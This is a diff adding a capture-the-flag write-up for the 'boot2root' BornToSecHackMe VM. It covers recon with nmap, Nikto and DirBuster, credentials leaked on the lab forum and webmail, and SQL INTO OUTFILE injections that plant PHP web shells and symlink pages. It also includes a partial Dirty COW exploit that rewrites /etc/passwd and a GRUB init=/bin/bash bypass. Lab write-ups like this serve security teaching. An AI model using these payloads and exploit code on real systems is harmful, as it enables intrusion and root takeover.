@@ -1,0 +1,301 @@
+boot2root
+Problem: We have a distribution kit BornToSecHackMe-v1.1.iso from the 42.fr side in which you need to get root superuser rights.
+
+Having launched the distribution kit, we can find that this time the ip-address is not displayed as it was in snow-crash, so we will need to find it.
+
+We start VirtualBox with Kali already installed, but before starting the BornToSecHackMe-v1.1.iso and Kali distribution, go to Tools -> Network and create a network card. By default it will be namedvboxnet0, in this case, the host system will be our iMac / macBook, VirtualBox will act as the middleman, and Kali and BornToSecHackMe-v1.1 will be the guest systems, after we made the network card we go to the settings of our machines because we will need to configure the adapter for them Host-only, what does this adapter do? The adapter creates a network between the host system and the virtual machine, bypassing the physical NIC. A software network interface appears on the computer, which serves to exchange data between virtual machines and the host system. Virtual machines can connect to each other and the host system as if connected through a switch. As with intranet mode, no physical interface is provided to the virtual machine, due to which the machines cannot communicate with the external network. The VirtualBox Host-Only Network device appears on the host system. It has its own subnet192.168.56.0and the gateway with the address - 192.168.56.1. The device connects the subnet and the host system without direct access to the external network.
+
+Now we need to make sure that we are really on the same subnet, start our machines and this time we will perform all operations with Kali, a neat way to do this is to ping a broadcast address that will fill our local arp table cache.
+
+ping -b 192.168.1.255
+Let me remind you: Broadcast address is a conditional (not assigned to any device on the network) address that is used to transmit broadcast packets in computer networks.
+
+arp -a
+With our Kali, you can immediately use the nmap utility to search for vulnerabilities and drive the following: nmap 192.168.56.1-255 thereby check for vulnerability all devices that are on the same subnet with us and rewrite the arptable, if anything, then BornToSecHackMe-v1.1 will light up there.
+
+After that, we will see the following:
+
+Nmap scan report for 192.168.56.XX
+Host is up (0.0010s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+So what do we have? We see open ports and understand what we can do, but so far the question remains where to get accounts and passwords for them? Let's go to port 80 and see what we have there? We drive in the address into the search bar 192.168.X.XX:80 Next, we find ourselves on a regular Internet page on which it is written 'HACK ME', let's try to search for information here, opening the developer panel in the hope of finding something interesting in the html markup, I found exactly fucking. Do we remember that we are sitting with Kali? Ok, let it out Nikto.
+
+What is Nikto? NiktoIs an open source (GPL) scanner for web servers, it performs complex tests against servers in several areas, including over 6,700 potentially dangerous files / programs, checking for outdated versions of over 1250 servers and issues specific to versions over 270 servers. The scanner also checks server configuration items such as the presence of multiple index files, HTTP server options, and tries to determine the name and versions of the web server and software.
+
+On the official website, the changes froze at version 2.1.5 already in 2012. Nevertheless, under the guidance of the author, the project lives on GitHub, users regularly add changes to the database and plugins to scan for new vulnerabilities, new versions, etc.
+
+Nikto was not designed to be inconspicuous. It will test the web server in the fastest possible time, it is obvious that its activity will get into the web server logs and into the field of vision of IPS / IDS (intrusion detection / prevention systems). However, there is support for anti-IDS methods from LibWhisker in case you want to try them (or test your IDS system).
+
+Not every check is related to a security issue, although most are. Some of the items are information-only checks that look for things that might not have security holes, but the webmaster or security engineer might not be aware that this is present on the server. Typically, these items are labeled appropriately in the output. There are also some checks for unknown items that have been seen in the log files.
+
+Now I advertised Nikto and I didn't get paid for it.
+
+We drive in: nikto -h https://192.168.56.XX
+
+What do we get after? We get a couple of directories that may be of interest to us, and this forum, webmail,phpMyAdmin
+
+Now we have a route, what have we driven? Let's go through all these points and the first point will be the forum https://192.168.56.XX/forum/, then we will go to the mail https://192.168.56.XX/webmail/, and finally, let's look at the database https://192.168.56.XX/phpmyadmin/. After we walked through all these points, we understand that we also lack logins and passwords, but we have a forum where you can try to search for information. After surfing the forum, I managed to find a genius there, who showed his password quite openly -> the wording was as follows Failed password for invalid user !q\]Ej?*5K5cy*AJ, this genius turned out to be lmezard, let's log in to the forum.
+
+Logged into the forum and let's go to the profile, in the profile we looked at the information about the user and found his email address there.
+
+Now we have mail, which means you can try to go see how the mail is doing https://192.168.56.XX/webmail/, as it turned out, the password remained the same!q\]Ej?*5K5cy*AJ
+
+After logging into the mail, attention immediately falls on DB Access, we open and see the login and password there, root/Fg-'kKXBj87E:aJ$knowing what we have, we phpMyAdminimmediately go there https://192.168.56.XX/phpmyadmin/, this time we will ask how the database is doing.
+
+Now there will be quite interesting moments about SQL инъекцииand what can be if you do not defend yourself from them.
+
+One of the ultimate goals of a hack is to get shells to execute system commands and own the target or network. SQL injection is usually only concerned with databases and their data, but can actually be used as a vector to get a command shell. As an experiment, we will use a simple SQL injection error to execute commands.
+
+In general, how do we understand all this and what should be done?
+
+We need to define the root directory of the web server to load our shell. This can vary depending on the application and the type of web server used, especially if the administrator changes the default location or has the appropriate permissions. For the purposes of this demo, we will assume that the default Apache web root (/ var / www /) is used with public write permissions. Information about the web server, including the root directory, can usually be found in the "phpinfo.php" file, but in this case we'll just let loose DirBuster.
+
+What is it DirBuster?
+
+DirBusterIs a multithreaded Java application designed to brute force the names of directories and files of web applications and web servers. DirBuster tries to find hidden directories and files.
+
+However, such tools are valuable in no small part for their lists of directories and files. Several dictionaries are supplied with this program, which were compiled from the real names of files and directories. There are 9 dictionaries in DirBuster, their description will be given below. But if this is not enough, then DirBuster can do pure brute force, from which nothing can hide! Of course, if you have time😉
+
+Homepage: https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project
+
+What is it and what is it for? -> Launched DirBusterand received an answer.
+
+Question: There are two folders - templates_cand cache, which are used when using Smarty with caching.
+
+Answer: templates_c- used for compiled templates, but no actual content that can be dynamically inserted into them. On the other hand, the cache folder is used for what you know as cached pages — complete pages that served the user instead of having to re-compile them each time.
+
+Now we understand what we have templates_c- a directory that always needs write permission.
+
+We can use the into outfile command to write to a file. In this case, we will insert a simple PHP script that will be able to run system commands. The script, which we aptly call cmd.php, should look like this:<?php system($_GET["cmd"]); ?>
+
+Now let's do the injection. We will need to use double quotes in the script, since we need to enclose the second part of the statement in single quotes to avoid syntax errors. A complete injection would look like this:SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
+
+Let's check what we did, type in the address bar of the browser https://192.168.56.XX/forum/templates_c/cmd.php?cmd=pwdand if we received in response /var/www/forum/templates_c, then the prank was a success
+
+Let's remember what is it curl? In fact, curl is a set of libraries that implement the basic functionality of URL paging and file transfer. The library supports the following protocols: FTP, FTPS, HTTP, HTTPS, TFTP, SCP, SFTP, Telnet, DICT, LDAP, as well as POP3, IMAP and SMTP. It is great for simulating user actions on pages and other URL operations.
+
+Open a terminal on Kali and write: curl --insecure 'https://192.168.56.XX/forum/templates_c/cmd.php?cmd=ls%20-la%20/home'
+
+drwxrwx--x 9 www-data             root                 126 Oct 13  2015 .
+ drwxr-xr-x 1 root                 root                 200 Apr 16 04:01 ..
+ drwxr-x--- 2 www-data             www-data              31 Oct  8  2015 LOOKATME
+ drwxr-x--- 6 ft_root              ft_root              156 Jun 17  2017 ft_root
+ drwxr-x--- 3 laurie               laurie               143 Oct 15  2015 laurie
+ drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15  2015 laurie@borntosec.net
+ dr-xr-x--- 2 lmezard              lmezard               61 Oct 15  2015 lmezard
+ drwxr-x--- 3 thor                 thor                 129 Oct 15  2015 thor
+ drwxr-x--- 4 zaz                  zaz                  147 Oct 15  2015 zaz
+I think you now understand what you can do? Just to remind you that %20this is a space character.
+
+Looking ahead, we see the file LOOKATMEthis file contains the username and passwordlmezard:G!@M6f4Eatau{sF"
+
+What do we have left now? Let's try SSHorFTP
+
+Nmap scan report for 192.168.56.XX
+Host is up (0.0010s latency).
+Not shown: 994 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+143/tcp open  imap
+443/tcp open  https
+993/tcp open  imaps
+We managed to log in via FTP connection, we have two files, one of which is clear to us, this is normal README, and the second file is funnot clear. Let's try to open it through a text editor, I'm sure that this will not give us a result, and it happened, then we tried to parse it through the utility strings, but nothing came of it either, okay, let's find out what kind of file it is, we cut the utility with the fileargument , we submit the same file file fun, after Why do we find out that this is a regular archive, well, it’s clear what to do tar -xf fun. Okay, a derrictor has appeared ft_fun, opening it and examining it, we realized that files with the extension.pcapnaive we immediately went to wireshark and tried to merge all these files, but it turned out to be impossible. Having studied this issue, we realized that we just can't solve it, then we decided to resort to the help of colleagues, everything was decided with the help of a python script.
+
+#! /usr/bin/env python3
+import os
+import re
+import sys
+
+results = {}
+
+for file in os.listdir("ft_fun"):
+    f = open("ft_fun/%s" % file, 'r')
+    content = f.read()
+    f.close()
+    file_line = re.search(r'//file([0-9]*)', content)
+    file_number = int(file_line.group(1))
+    results[file_number] = content
+
+original_stdout = sys.stdout
+with open("main.c", 'w+') as file:
+    sys.stdout = file
+    for _, value in sorted(results.items()):
+        print(value)
+    file.close()
+In short, these files have code Сиand comments, number / line.
+
+After completing all the manipulations with the code engineering, we received a password Iheartpwnage, but from whom is this password? Now we remember the mail and the user under the loginlaurie
+
+We only have the SSH protocol left, let's try to log in with a username laurieand password Iheartpwnage, here, looking ahead, I will say that this will not work. As it turned out, the password that we received needs to be hashed echo -n "Iheartpwnage" | shasum -a 256, we realized this only after time and prompts, now we can log in with a username laurieand password 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4.
+
+The next stage is quite difficult, it can be solved, but we did not waste time on this, this is reverse engineering and can be used Ghidra.
+
+We just use the vulnerability we named Dirty Cow.
+
+The Dirty COW vulnerability is a serious software vulnerability in the Linux kernel that has existed since 2007 and was patched in October 2016. With its help, a local user can elevate their privileges due to a race error in the implementation of the copy-on-write mechanism for memory pages marked with the Dirty bit flag
+
+Create a file in the directory dirty.c
+
+// This exploit uses the pokemon exploit of the dirtycow vulnerability
+// as a base and automatically generates a new passwd line.
+// The user will be prompted for the new password when the binary is run.
+// The original /etc/passwd file is then backed up to /tmp/passwd.bak
+// and overwrites the root account with the generated line.
+// After running the exploit you should be able to login with the newly
+// created user.
+//
+// To use this exploit modify the user values according to your needs.
+//   The default is "firefart".
+//
+// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
+//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
+//
+// Compile with:
+//   gcc -pthread dirty.c -o dirty -lcrypt
+//
+// Then run the newly create binary by either doing:
+//   "./dirty" or "./dirty my-new-password"
+//
+// Afterwards, you can either "su firefart" or "ssh firefart@..."
+//
+// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
+//   mv /tmp/passwd.bak /etc/passwd
+//
+// Exploit adopted by Christian "FireFart" Mehlmauer
+// https://firefart.at
+//
+
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/wait.h>
+#include <sys/ptrace.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <crypt.h>
+
+const char *filename = "/etc/passwd";
+const char *backup_filename = "/tmp/passwd.bak";
+const char *salt = "firefart";
+
+int f;
+void *map;
+pid_t pid;
+pthread_t pth;
+struct stat st;
+
+struct Userinfo {
+   char *username;
+   char *hash;
+   int user_id;
+   int group_id;
+   char *info;
+   char *home_dir;
+   char *shell;
+};
+
+char *generate_password_hash(char *plaintext_pw) {
+  return crypt(plaintext_pw, salt);
+}
+
+char *generate_passwd_line(struct Userinfo u) {
+  const char *format = "%s:%s:%d:%d:%s:%s:%s\n";
+  int size = snprintf(NULL, 0, format, u.username, u.hash,
+    u.user_id, u.group_id, u.info, u.home_dir, u.shell);
+  char *ret = malloc(size + 1);
+  sprintf(ret, format, u.username, u.hash, u.user_id,
+    u.group_id, u.info, u.home_dir, u.shell);
+  return ret;
+}
+
+void *madviseThread(void *arg) {
+  int i, c = 0;
+  for(i = 0; i < 200000000; i++) {
+    c += madvise(map, 100, MADV_DONTNEED);
+  }
+  printf("madvise %d\n\n", c);
+}
+
+int copy_file(const char *from, const char *to) {
+  // check if target file already exists
+  if(access(to, F_OK) != -1) {
+    printf("File %s already exists! Please delete it and run again\n",
+      to);
+    return -1;
+  }
+
+  char ch;
+  FILE *source, *target;
+
+  source = fopen(from, "r");
+  if(source == NULL) {
+    return -1;
+  }
+  target = fopen(to, "w");
+  if(target == NULL) {
+     fclose(source);
+     return -1;
+  }
+
+  while((ch = fgetc(source)) != EOF) {
+     fputc(ch, target);
+   }
+
+  printf("%s successfully backed up to %s\n",
+    from, to);
+
+  fclose(source);
+  fclose(target);
+
+  return 0;
+}
+This is not all the code, look dirty.c, then you know what to do. Enjoy!
+
+When the system boots, we hold down Shiftto get to the boot menuGrub
+
+Before entering anything, click on tabto see which core is available
+
+We type: live init=/bin/bash
+
+In short, this function is used for system maintenance, it allows you to restore the system from corrupted initialization files or change a forgotten password.
+
+This post on the Red Hat mailing list explains a few things: On Unix-like systems, init is the first process to run, and is the ancestor of all processes ever run. He is responsible for running all init scripts.
+
+https://listman.redhat.com/archives/rhl-list/2005-March/msg04089.html
+
+You are telling the Linux kernel to run / bin / bash as init, not as a system init, so you are not using anything, you are just using a standard kernel function.
+
+BONUS
+Apache suEXEC vulnerability
+
+Several vulnerabilities were found in the suexec system from the apache 1.3.x and 2.x bundles, which could allow a local attacker to run his script with the rights of another unprivileged user:
+
+Possibility of changing the directory to a symlink (Race Condition), at the moment after checking the directory and before switching to it.
+
+A design error in the path checking code, the entry of a subdirectory is defined through strncmp(), i.e. in addition to the directory described in the config, the "/var/www/html"check will be successful for "/var/www/html_backup"or "/var/www/htmleditor".
+
+Having the ability to run suexec with command line parameters (usually, it is allowed to run only with the uid of the httpd process), an attacker can create files c UIDand GIDother users.
+
+After investigation, we found that this version is vulnerable. One of the vulnerabilities we will be exploiting is path traversal. We can create a symbolic link from /and a page phpto access files that the user www-datacan read.
+
+Check version: nmap -sV 192.168.56.XX
+
+Let's do SQL injection again: SELECT 1, '<?php symlink(\"/\", \"paths.php\");?>' INTO OUTFILE '/var/www/forum/templates_c/run.php'after that, you can immediately go to the address https://192.168.56.XX/forum/templates_c/run.phpto run our small script, as soon as the script runs, we see it in the browser window 1, so you can go to the following addresshttps://192.168.56.XX/forum/templates_c/paths.php
+
+Congratulations, you have access to all directories, good luck!
+
+Other implementations of obtaining superuser rights https://dirtycow.ninja/
